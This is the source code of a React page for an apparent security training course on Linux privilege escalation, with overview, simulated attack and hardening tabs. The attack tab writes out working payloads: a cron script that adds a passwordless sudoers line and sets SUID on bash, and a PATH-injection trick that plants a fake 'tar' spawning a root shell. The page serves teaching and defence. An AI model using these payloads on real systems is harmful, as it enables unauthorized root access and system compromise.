import { Navigation } from "@/components/Navigation";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { useState } from "react";
import { Link } from "react-router-dom";
import { Home, ChevronLeft, ChevronRight, Terminal, Shield, Zap, CheckCircle, AlertTriangle } from "lucide-react";

const Level17 = () => {
  const [activeTab, setActiveTab] = useState("overview");
  const [selectedVector, setSelectedVector] = useState("");
  const [enumerationRun, setEnumerationRun] = useState(false);
  const [exploitChoice, setExploitChoice] = useState("");
  const [exploitStep, setExploitStep] = useState(0);
  const [cronCommand, setCronCommand] = useState("");
  const [suidCommand, setSuidCommand] = useState("");
  const [auditStep, setAuditStep] = useState(0);
  const [selectedCron, setSelectedCron] = useState("");
  const [sudoersFixed, setSudoersFixed] = useState(false);

  const vectors = {
    "SUID/SGID Binaries": {
      description: "Programs that run with elevated privileges regardless of who executes them",
      risk: "Critical - Direct privilege escalation",
      example: "Custom SUID binary with path injection vulnerability"
    },
    "Cron Jobs": {
      description: "Scheduled tasks that may run with higher privileges",
      risk: "High - Code execution as privileged user",
      example: "World-writable scripts executed by root cron"
    },
    "Sudo Misconfigurations": {
      description: "Overly permissive sudo rules allowing privilege escalation",
      risk: "High - Command execution with elevated privileges",
      example: "Wildcard sudo permissions on dangerous binaries"
    },
    "Kernel Exploits": {
      description: "Vulnerabilities in the Linux kernel itself",
      risk: "Critical - Complete system compromise",
      example: "DirtyCow, OverlayFS, and similar kernel bugs"
    }
  };

  const cronJobs = [
    { path: "/etc/cron.daily/backup.sh", permissions: "-rwxr-xr-x", owner: "root:root", vulnerable: false },
    { path: "/etc/cron.hourly/cleanup.sh", permissions: "-rwxrwxrwx", owner: "root:root", vulnerable: true },
    { path: "/var/spool/cron/crontabs/user", permissions: "-rw-------", owner: "user:user", vulnerable: false },
    { path: "/etc/cron.d/maintenance", permissions: "-rw-r--r--", owner: "root:root", vulnerable: false }
  ];

  return (
    <div className="min-h-screen bg-background">
      <Navigation />
      <main className="pt-24 px-4">
        <div className="container mx-auto max-w-6xl">
          <div className="text-center mb-8">
            <div className="mb-4">
              <span className="text-primary text-sm font-semibold">INTERMEDIATE TRACK</span>
            </div>
            <h1 className="text-4xl font-bold mb-4 cyber-gradient">Level 17: Linux Privilege Escalation</h1>
            <p className="text-xl text-muted-foreground">Master the techniques to become root on a Linux system.</p>
          </div>
          
          <div className="sticky top-20 z-40 glass border border-border/50 rounded-lg p-1 mb-8">
            <div className="flex space-x-1">
              {[
                { id: "overview", label: "1. Overview: The Linux Landscape" }, 
                { id: "offensive", label: "2. Offensive Ops: Finding a Foothold" }, 
                { id: "defensive", label: "3. Defensive Ops: Hardening Linux" }
              ].map((tab) => (
                <button 
                  key={tab.id} 
                  onClick={() => setActiveTab(tab.id)} 
                  className={`flex-1 px-4 py-2 rounded-md font-medium transition-all ${
                    activeTab === tab.id ? 'bg-primary text-primary-foreground' : 'text-muted-foreground hover:text-foreground'
                  }`}
                >
                  {tab.label}
                </button>
              ))}
            </div>
          </div>

          {activeTab === "overview" && (
            <div className="space-y-8">
              <Card className="glass border-primary/20">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Terminal className="w-5 h-5 text-primary" />
                    Linux Permission Model & Escalation Paths
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-6">
                  <p className="text-lg">
                    Linux privilege escalation leverages the fundamental Unix permission model and system 
                    configurations to gain higher privileges. Understanding file permissions, process ownership, 
                    and system services is key to both exploitation and defense.
                  </p>
                  
                  <div className="grid lg:grid-cols-2 gap-8">
                    <div className="space-y-4">
                      <h3 className="text-xl font-semibold text-cyber-cyan">Permission Model Comparison</h3>
                      <div className="space-y-3">
                        <div className="p-4 bg-cyan-500/10 border border-cyan-500/30 rounded-lg">
                          <div className="font-semibold text-cyan-400 mb-2">Linux Permissions</div>
                          <div className="bg-black/50 p-3 rounded text-sm font-mono">
                            <div className="text-white">rwxrwxrwx</div>
                            <div className="text-cyan-400">|||||||-- Other (everyone)</div>
                            <div className="text-cyan-400">||||-- Group</div>
                            <div className="text-cyan-400">|-- Owner (user)</div>
                            <div className="text-yellow-400 mt-2">r=read, w=write, x=execute</div>
                          </div>
                        </div>
                        
                        <div className="p-4 bg-purple-500/10 border border-purple-500/30 rounded-lg">
                          <div className="font-semibold text-purple-400 mb-2">Special Permissions</div>
                          <div className="text-sm space-y-1">
                            <div><strong>SUID (4):</strong> Execute as file owner</div>
                            <div><strong>SGID (2):</strong> Execute as file group</div>
                            <div><strong>Sticky (1):</strong> Only owner can delete</div>
                          </div>
                        </div>
                      </div>
                    </div>
                    
                    <div className="space-y-4">
                      <h3 className="text-xl font-semibold text-cyber-purple">vs Windows Model</h3>
                      <div className="p-4 bg-purple-500/10 border border-purple-500/30 rounded-lg">
                        <div className="text-sm space-y-2">
                          <div className="font-semibold text-purple-400">Key Differences:</div>
                          <div>• Linux: File-based permissions with user/group/other</div>
                          <div>• Windows: ACL-based with complex inheritance</div>
                          <div>• Linux: Single root user (UID 0)</div>
                          <div>• Windows: Multiple admin accounts and groups</div>
                          <div>• Linux: SUID for temporary privilege elevation</div>
                          <div>• Windows: Service accounts and impersonation</div>
                        </div>
                      </div>
                      
                      <div className="p-4 bg-red-500/10 border border-red-500/30 rounded-lg">
                        <div className="font-semibold text-red-400 mb-2">⚠️ Attack Implications</div>
                        <div className="text-sm space-y-1">
                          <div>• World-writable files = potential code execution</div>
                          <div>• SUID binaries = direct escalation vectors</div>
                          <div>• Cron jobs = scheduled privilege execution</div>
                          <div>• Sudo rules = command-based elevation</div>
                        </div>
                      </div>
                    </div>
                  </div>
                  
                  <div className="space-y-4">
                    <h3 className="text-xl font-semibold text-cyber-magenta">Common Escalation Vectors</h3>
                    <div className="grid md:grid-cols-2 gap-4">
                      {Object.entries(vectors).map(([vector, info]) => (
                        <div 
                          key={vector}
                          className={`p-4 border rounded-lg cursor-pointer transition-all ${
                            selectedVector === vector 
                              ? 'border-primary bg-primary/10' 
                              : 'border-border/50 hover:border-primary/50'
                          }`}
                          onClick={() => setSelectedVector(selectedVector === vector ? "" : vector)}
                        >
                          <h4 className="font-semibold text-primary mb-2">{vector}</h4>
                          <p className="text-sm text-muted-foreground mb-2">{info.description}</p>
                          {selectedVector === vector && (
                            <div className="space-y-2 animate-fade-in">
                              <div className="text-sm">
                                <span className="font-semibold text-red-400">Risk Level:</span> {info.risk}
                              </div>
                              <div className="text-sm">
                                <span className="font-semibold text-yellow-400">Example:</span> {info.example}
                              </div>
                            </div>
                          )}
                        </div>
                      ))}
                    </div>
                  </div>
                  
                  <div className="p-4 bg-yellow-500/10 border border-yellow-500/30 rounded-lg">
                    <h4 className="font-semibold text-yellow-400 mb-3">Enumeration is Key</h4>
                    <div className="grid md:grid-cols-3 gap-4 text-sm">
                      <div>
                        <div className="font-semibold mb-2 text-cyan-400">File System</div>
                        <div className="space-y-1">
                          <div><code className="text-xs bg-black/30 px-1 rounded">find / -perm -4000</code></div>
                          <div><code className="text-xs bg-black/30 px-1 rounded">find / -writable</code></div>
                          <div>Search for SUID binaries and writable files</div>
                        </div>
                      </div>
                      <div>
                        <div className="font-semibold mb-2 text-purple-400">System Info</div>
                        <div className="space-y-1">
                          <div><code className="text-xs bg-black/30 px-1 rounded">uname -a</code></div>
                          <div><code className="text-xs bg-black/30 px-1 rounded">sudo -l</code></div>
                          <div>Kernel version, sudo permissions</div>
                        </div>
                      </div>
                      <div>
                        <div className="font-semibold mb-2 text-green-400">Processes</div>
                        <div className="space-y-1">
                          <div><code className="text-xs bg-black/30 px-1 rounded">ps aux</code></div>
                          <div><code className="text-xs bg-black/30 px-1 rounded">crontab -l</code></div>
                          <div>Running processes, scheduled tasks</div>
                        </div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}

          {activeTab === "offensive" && (
            <div className="space-y-8">
              <Card className="glass border-red-500/20">
                <CardHeader>
                  <CardTitle className="text-red-400 flex items-center gap-2">
                    <Zap className="w-5 h-5" />
                    Privilege Escalation Scenario
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-6">
                  <div className="p-4 bg-red-500/10 border border-red-500/30 rounded-lg">
                    <div className="text-red-400 font-semibold mb-2">🎯 Scenario</div>
                    <div className="text-sm">
                      You have gained a low-privilege shell on a Linux web server through a web application vulnerability. 
                      Your goal is to escalate privileges to root to complete your objectives.
                    </div>
                  </div>
                  
                  {/* Stage 1: Enumeration */}
                  <div className="space-y-4">
                    <h4 className="font-semibold text-red-400">Stage 1: System Enumeration</h4>
                    <div className="grid lg:grid-cols-2 gap-6">
                      <div className="space-y-3">
                        <div className="p-4 bg-black/50 rounded-lg">
                          <div className="text-green-400 font-mono mb-2">www-data@webserver:~$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</div>
                          <div className="text-green-400 font-mono mb-2">www-data@webserver:~$ chmod +x linpeas.sh</div>
                          <div className="text-green-400 font-mono mb-2">www-data@webserver:~$ ./linpeas.sh</div>
                          
                          <Button 
                            onClick={() => setEnumerationRun(true)}
                            size="sm"
                          >
                            Run LinPEAS
                          </Button>
                        </div>
                      </div>
                      
                      <div className="space-y-3">
                        {enumerationRun && (
                          <div className="p-4 bg-blue-500/10 border border-blue-500/30 rounded-lg animate-fade-in">
                            <div className="text-blue-400 font-semibold mb-2">📊 LinPEAS Output (Highlights)</div>
                            <div className="bg-black/50 p-3 rounded text-xs font-mono">
                              <div className="text-green-400">╔══════════╣ Interesting writable files owned by me or writable by everyone</div>
                              <div className="text-red-400">/etc/cron.hourly/cleanup.sh (writable by everyone!)</div>
                              <div className="text-white">─────────────────────────────────────</div>
                              <div className="text-green-400">╔══════════╣ SUID binaries</div>
                              <div className="text-white">/usr/bin/sudo</div>
                              <div className="text-white">/usr/bin/passwd</div>
                              <div className="text-red-400">/opt/maintenance/backup_tool (custom binary!)</div>
                              <div className="text-white">─────────────────────────────────────</div>
                              <div className="text-green-400">╔══════════╣ Analyzing .sh files</div>
                              <div className="text-yellow-400">backup_tool appears to call system() with user input</div>
                            </div>
                          </div>
                        )}
                      </div>
                    </div>
                  </div>

                  {/* Stage 2: Vector Selection */}
                  {enumerationRun && (
                    <div className="space-y-4 animate-fade-in">
                      <h4 className="font-semibold text-red-400">Stage 2: Choose Your Exploitation Path</h4>
                      <div className="grid md:grid-cols-2 gap-4">
                        <div 
                          className={`p-4 border rounded-lg cursor-pointer transition-all ${
                            exploitChoice === "cron" ? 'border-red-500 bg-red-500/10' : 'border-border/50 hover:border-red-500/50'
                          }`}
                          onClick={() => setExploitChoice("cron")}
                        >
                          <div className="font-semibold text-red-400 mb-2">🕐 Cron Job Attack</div>
                          <div className="text-sm mb-2">Target: /etc/cron.hourly/cleanup.sh</div>
                          <div className="text-xs text-muted-foreground">
                            World-writable script executed by root every hour
                          </div>
                        </div>
                        
                        <div 
                          className={`p-4 border rounded-lg cursor-pointer transition-all ${
                            exploitChoice === "suid" ? 'border-red-500 bg-red-500/10' : 'border-border/50 hover:border-red-500/50'
                          }`}
                          onClick={() => setExploitChoice("suid")}
                        >
                          <div className="font-semibold text-red-400 mb-2">⚡ SUID Binary Attack</div>
                          <div className="text-sm mb-2">Target: /opt/maintenance/backup_tool</div>
                          <div className="text-xs text-muted-foreground">
                            Custom SUID binary with path injection vulnerability
                          </div>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* Stage 3: Exploitation */}
                  {exploitChoice === "cron" && (
                    <div className="space-y-4 animate-fade-in">
                      <h4 className="font-semibold text-red-400">Stage 3: Cron Job Exploitation</h4>
                      <div className="grid lg:grid-cols-2 gap-6">
                        <div className="space-y-3">
                          <div className="text-sm font-semibold">Overwrite the cleanup script with malicious payload:</div>
                          <Textarea 
                            value={cronCommand}
                            onChange={(e) => setCronCommand(e.target.value)}
                            placeholder={`echo '#!/bin/bash
# Malicious payload
echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
chmod +s /bin/bash' > /etc/cron.hourly/cleanup.sh`}
                            className="bg-gray-900 text-green-400 font-mono text-xs"
                            rows={6}
                          />
                          
                          <Button 
                            onClick={() => {
                              if (cronCommand.includes("sudoers") || cronCommand.includes("chmod +s")) {
                                setExploitStep(1);
                              }
                            }}
                            size="sm"
                          >
                            Execute Payload
                          </Button>
                        </div>
                        
                        <div className="space-y-3">
                          {exploitStep === 1 && (
                            <div className="p-4 bg-green-500/20 border border-green-500/50 rounded-lg">
                              <div className="text-green-400 font-semibold mb-2">✅ Exploitation Successful!</div>
                              <div className="bg-black/50 p-3 rounded text-sm font-mono">
                                <div className="text-green-400">www-data@webserver:~$ sudo su -</div>
                                <div className="text-red-400">root@webserver:~# whoami</div>
                                <div className="text-white">root</div>
                                <div className="text-red-400">root@webserver:~# id</div>
                                <div className="text-white">uid=0(root) gid=0(root) groups=0(root)</div>
                              </div>
                              <div className="text-sm mt-2 text-green-300">
                                🎯 Root privileges obtained via cron job modification!
                              </div>
                            </div>
                          )}
                        </div>
                      </div>
                    </div>
                  )}

                  {exploitChoice === "suid" && (
                    <div className="space-y-4 animate-fade-in">
                      <h4 className="font-semibold text-red-400">Stage 3: SUID Binary Exploitation</h4>
                      <div className="grid lg:grid-cols-2 gap-6">
                        <div className="space-y-3">
                          <div className="text-sm font-semibold">Exploit path injection in backup_tool:</div>
                          <Textarea 
                            value={suidCommand}
                            onChange={(e) => setSuidCommand(e.target.value)}
                            placeholder={`# Create malicious 'tar' in /tmp
echo '#!/bin/bash
/bin/bash -p' > /tmp/tar
chmod +x /tmp/tar

# Modify PATH and execute SUID binary
export PATH=/tmp:$PATH
/opt/maintenance/backup_tool /home/user`}
                            className="bg-gray-900 text-green-400 font-mono text-xs"
                            rows={8}
                          />
                          
                          <Button 
                            onClick={() => {
                              if (suidCommand.includes("PATH=/tmp") && suidCommand.includes("backup_tool")) {
                                setExploitStep(2);
                              }
                            }}
                            size="sm"
                          >
                            Execute Path Injection
                          </Button>
                        </div>
                        
                        <div className="space-y-3">
                          {exploitStep === 2 && (
                            <div className="p-4 bg-green-500/20 border border-green-500/50 rounded-lg">
                              <div className="text-green-400 font-semibold mb-2">✅ Path Injection Successful!</div>
                              <div className="bg-black/50 p-3 rounded text-sm font-mono">
                                <div className="text-green-400">www-data@webserver:~$ /opt/maintenance/backup_tool /home/user</div>
                                <div className="text-white">Starting backup process...</div>
                                <div className="text-yellow-400">Executing: tar -czf backup.tar.gz /home/user</div>
                                <div className="text-red-400">root@webserver:~# whoami</div>
                                <div className="text-white">root</div>
                                <div className="text-red-400">root@webserver:~# id</div>
                                <div className="text-white">uid=0(root) gid=0(root) groups=0(root)</div>
                              </div>
                              <div className="text-sm mt-2 text-green-300">
                                🎯 Root shell obtained via SUID binary path injection!
                              </div>
                            </div>
                          )}
                        </div>
                      </div>
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>
          )}

          {activeTab === "defensive" && (
            <div className="space-y-8">
              <Card className="glass border-blue-500/20">
                <CardHeader>
                  <CardTitle className="text-blue-400 flex items-center gap-2">
                    <Shield className="w-5 h-5" />
                    Linux System Hardening
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-6">
                  <div className="grid lg:grid-cols-2 gap-6">
                    {/* Challenge 1: Cron Job Audit */}
                    <div className="space-y-4">
                      <h4 className="font-semibold text-blue-400">Challenge 1: Cron Job Security Audit</h4>
                      <div className="space-y-3">
                        <div className="text-sm font-semibold">Identify and fix the vulnerable cron job:</div>
                        <div className="bg-black/50 p-3 rounded text-xs font-mono">
                          <div className="text-cyan-400">Cron Jobs Analysis:</div>
                          {cronJobs.map((cron, i) => (
                            <div 
                              key={i}
                              className={`cursor-pointer hover:bg-gray-800 p-1 rounded transition-colors ${
                                cron.vulnerable ? 'text-red-400' : 'text-white'
                              } ${selectedCron === cron.path ? 'bg-red-500/20' : ''}`}
                              onClick={() => {
                                setSelectedCron(cron.path);
                                if (cron.vulnerable) setAuditStep(1);
                              }}
                            >
                              <div>{cron.permissions} {cron.owner} {cron.path}</div>
                            </div>
                          ))}
                        </div>
                        
                        {auditStep === 1 && (
                          <div className="space-y-2 animate-fade-in">
                            <div className="p-3 bg-red-500/20 border border-red-500/50 rounded-lg">
                              <div className="text-red-400 font-semibold text-sm">⚠️ Vulnerability Found</div>
                              <div className="text-xs">/etc/cron.hourly/cleanup.sh is world-writable!</div>
                            </div>
                            
                            <Input 
                              placeholder="Enter chmod command to fix permissions..."
                              className="font-mono text-sm"
                              onKeyPress={(e) => {
                                if (e.key === 'Enter' && e.currentTarget.value.includes("chmod 755") && e.currentTarget.value.includes("cleanup.sh")) {
                                  setAuditStep(2);
                                }
                              }}
                            />
                          </div>
                        )}
                        
                        {auditStep === 2 && (
                          <div className="p-3 bg-green-500/20 border border-green-500/50 rounded-lg">
                            <div className="text-green-400 font-semibold text-sm">✅ Fixed!</div>
                            <div className="text-xs">chmod 755 /etc/cron.hourly/cleanup.sh - Removed world-write permissions</div>
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Challenge 2: Sudoers Configuration */}
                    <div className="space-y-4">
                      <h4 className="font-semibold text-blue-400">Challenge 2: Sudoers Security</h4>
                      <div className="space-y-3">
                        <div className="p-4 bg-red-500/10 border border-red-500/30 rounded-lg">
                          <div className="text-red-400 font-semibold mb-2">⚠️ Dangerous Sudoers Entry</div>
                          <div className="bg-black/50 p-3 rounded text-xs font-mono">
                            <div className="text-gray-400"># /etc/sudoers</div>
                            <div className="text-red-400">user ALL=(ALL) /usr/bin/find *</div>
                            <div className="text-white">admin ALL=(ALL) /usr/bin/vim /etc/config/*</div>
                            <div className="text-white">backup ALL=(ALL) NOPASSWD: /usr/bin/rsync</div>
                          </div>
                        </div>
                        
                        <div className="text-sm font-semibold">Fix the vulnerable sudo rule:</div>
                        <Textarea 
                          placeholder={`# Replace the dangerous wildcard rule with:
user ALL=(ALL) /usr/bin/find /var/log/ -name "*.log" -type f`}
                          className="bg-gray-900 text-green-400 font-mono text-xs"
                          rows={3}
                          onChange={(e) => {
                            if (e.target.value.includes("/var/log/") && e.target.value.includes("-name") && e.target.value.includes("-type f")) {
                              setSudoersFixed(true);
                            }
                          }}
                        />
                        
                        {sudoersFixed && (
                          <div className="p-3 bg-green-500/20 border border-green-500/50 rounded-lg">
                            <div className="text-green-400 font-semibold text-sm">✅ Sudoers Hardened!</div>
                            <div className="text-xs">Replaced wildcard with specific path and file type restrictions</div>
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                  
                  {auditStep === 2 && sudoersFixed && (
                    <div className="p-4 bg-green-500/20 border border-green-500/50 rounded-lg">
                      <div className="text-green-400 font-semibold flex items-center gap-2">
                        <CheckCircle className="w-5 h-5" />
                        Linux System Hardening Complete!
                      </div>
                      <div className="text-sm mt-2">
                        You've successfully identified and remediated common Linux privilege escalation vectors 
                        by fixing file permissions and securing sudo configurations.
                      </div>
                    </div>
                  )}
                  
                  <div className="p-4 bg-blue-500/10 border border-blue-500/30 rounded-lg">
                    <h4 className="font-semibold text-blue-400 mb-3">Additional Hardening Measures:</h4>
                    <div className="grid md:grid-cols-2 gap-4 text-sm">
                      <div className="space-y-2">
                        <div className="font-semibold">File System Security</div>
                        <div className="text-muted-foreground">Regular SUID/SGID binary audits, mount options (noexec, nosuid)</div>
                        
                        <div className="font-semibold">Access Control</div>
                        <div className="text-muted-foreground">SELinux/AppArmor, principle of least privilege</div>
                      </div>
                      <div className="space-y-2">
                        <div className="font-semibold">System Monitoring</div>
                        <div className="text-muted-foreground">File integrity monitoring, privilege escalation detection</div>
                        
                        <div className="font-semibold">Kernel Hardening</div>
                        <div className="text-muted-foreground">Kernel runtime security (KASLR, SMEP, SMAP)</div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}

          <div className="flex justify-between items-center py-8">
            <Button asChild variant="cyber-ghost" size="lg">
              <Link to="/level/16" className="flex items-center gap-2">
                <ChevronLeft className="w-4 h-4" />
                Previous
              </Link>
            </Button>
            <Button asChild variant="cyber-ghost" size="lg">
              <Link to="/" className="flex items-center gap-2">
                <Home className="w-4 h-4" />
                Home
              </Link>
            </Button>
            <Button asChild variant="cyber" size="lg">
              <Link to="/level/18" className="flex items-center gap-2">
                Next Level
                <ChevronRight className="w-4 h-4" />
              </Link>
            </Button>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Level17;